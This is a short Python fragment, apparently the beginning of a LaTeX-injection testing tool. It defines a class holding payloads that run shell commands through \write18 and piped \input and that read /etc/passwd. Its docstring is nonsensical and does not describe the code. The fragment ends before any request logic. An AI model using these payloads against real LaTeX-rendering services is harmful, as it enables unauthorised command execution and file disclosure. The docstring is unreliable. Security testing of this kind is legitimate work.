#coding:utf-8

import sys
import requests

from optparse import *
from threading import Thread

class Latex(object):
        def __init__(self, latex_payload=None):
                self.latex_payload = latex_payload

        def __str__(self, *args):
                """
                This function will take
                the port defined in the URL :D
                Parameters
                ----------
                self : X
                        The parameter 'self' is a supervariable that can communicate anywhere.
                Return
                ----------
                Return port or nothing
                """
                self.latex_payload = ["\immediate\write18{env}",
                                        "\input{/etc/passwd}",
                                        "\openin\file=/etc/passwd",
                                        "\input|env"]
